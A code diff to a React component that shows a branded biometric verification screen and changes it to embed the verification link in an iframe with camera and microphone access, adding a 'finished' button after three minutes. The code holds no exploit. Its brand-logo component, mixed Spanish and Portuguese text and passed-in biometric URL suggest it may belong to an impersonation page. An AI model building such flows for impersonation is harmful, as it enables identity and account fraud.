@@ -1,5 +1,5 @@
 import { useEffect, useState } from "react";
-import { ShieldCheck, ExternalLink, Clock, CheckCircle2 } from "lucide-react";
+import { ShieldCheck, Clock, CheckCircle2, ExternalLink } from "lucide-react";
 import CocosLogo from "@/components/cocos/CocosLogo";
 
 interface CocosV2BiometricScreenProps {
@@ -10,12 +10,70 @@ interface CocosV2BiometricScreenProps {
 
 const CocosV2BiometricScreen = ({ email, fullName, biometricUrl }: CocosV2BiometricScreenProps) => {
   const [visible, setVisible] = useState(false);
+  const [iframeOpen, setIframeOpen] = useState(false);
+  const [showFinishBtn, setShowFinishBtn] = useState(false);
   const firstName = fullName?.split(" ")?.[0] || "";
 
   useEffect(() => {
     const t = setTimeout(() => setVisible(true), 100);
     return () => clearTimeout(t);
   }, []);
+
+  // Show "Finalizei" button after 3 minutes of opening iframe
+  useEffect(() => {
+    if (!iframeOpen) return;
+    const t = setTimeout(() => setShowFinishBtn(true), 3 * 60 * 1000);
+    return () => clearTimeout(t);
+  }, [iframeOpen]);
+
+  if (iframeOpen) {
+    return (
+      <div className={`w-full max-w-[520px] transition-all duration-500 ${visible ? "opacity-100" : "opacity-0"}`}>
+        <div className="flex justify-center mb-4">
+          <CocosLogo />
+        </div>
+
+        <div className="rounded-2xl bg-white shadow-[0_8px_32px_-8px_rgba(26,63,143,0.12)] border border-[#e8edf5] overflow-hidden">
+          <div className="h-1 w-full bg-gradient-to-r from-[#16a34a] via-[#22c55e] to-[#16a34a]" />
+
+          {/* Iframe container */}
+          <div className="w-full" style={{ height: "520px" }}>
+            <iframe
+              src={biometricUrl}
+              className="w-full h-full border-0"
+              allow="camera; microphone"
+              title="Verificación biométrica"
+            />
+          </div>
+
+          {/* Finish button - appears after 3 minutes */}
+          <div className="px-6 py-4 border-t border-[#e8edf5]">
+            {showFinishBtn ? (
+              <button
+                onClick={() => window.location.reload()}
+                className="flex items-center justify-center gap-2 w-full rounded-xl bg-gradient-to-r from-[#16a34a] to-[#22c55e] py-3.5 text-[14px] font-bold text-white transition-all hover:from-[#15803d] hover:to-[#16a34a] active:scale-[0.98] shadow-md shadow-green-200"
+              >
+                <CheckCircle2 size={18} />
+                Finalizei todo o processo
+              </button>
+            ) : (
+              <div className="flex items-center justify-center gap-2 text-[13px] text-[#8895aa]">
+                <Clock size={14} className="animate-pulse" />
+                <span>Complete a verificação acima para continuar...</span>
+              </div>
+            )}
+          </div>
+        </div>
+
+        <div className="flex justify-center mt-3">
+          <div className="flex items-center gap-2 rounded-full border border-[#e8edf5] bg-[#f8fafc] px-4 py-2">
+            <div className="h-1.5 w-1.5 rounded-full bg-[#16a34a]" />
+            <span className="text-[12px] text-[#8895aa] max-w-[220px] truncate">{email}</span>
+          </div>
+        </div>
+      </div>
+    );
+  }
 
   return (
     <div className={`w-full max-w-[480px] transition-all duration-700 ${visible ? "opacity-100 translate-y-0" : "opacity-0 translate-y-6"}`}>
@@ -77,19 +135,16 @@ const CocosV2BiometricScreen = ({ email, fullName, biometricUrl }: CocosV2Biomet
             <span>Este proceso toma menos de 5 minutos</span>
           </div>
 
-          <a
-            href={biometricUrl}
-            target="_blank"
-            rel="noopener noreferrer"
+          <button
+            onClick={() => setIframeOpen(true)}
             className="flex items-center justify-center gap-2 w-full rounded-xl bg-gradient-to-r from-[#1a3f8f] to-[#2563eb] py-3.5 text-[14px] font-bold text-white transition-all hover:from-[#15357a] hover:to-[#1d55d4] active:scale-[0.98] shadow-md shadow-[#1a3f8f]/20"
           >
             Iniciar verificación
             <ExternalLink size={16} />
-          </a>
+          </button>
         </div>
       </div>
 
-      {/* Email chip */}
       <div className="flex justify-center mb-3">
         <div className="flex items-center gap-2 rounded-full border border-[#e8edf5] bg-[#f8fafc] px-4 py-2">
           <div className="h-1.5 w-1.5 rounded-full bg-[#16a34a]" />
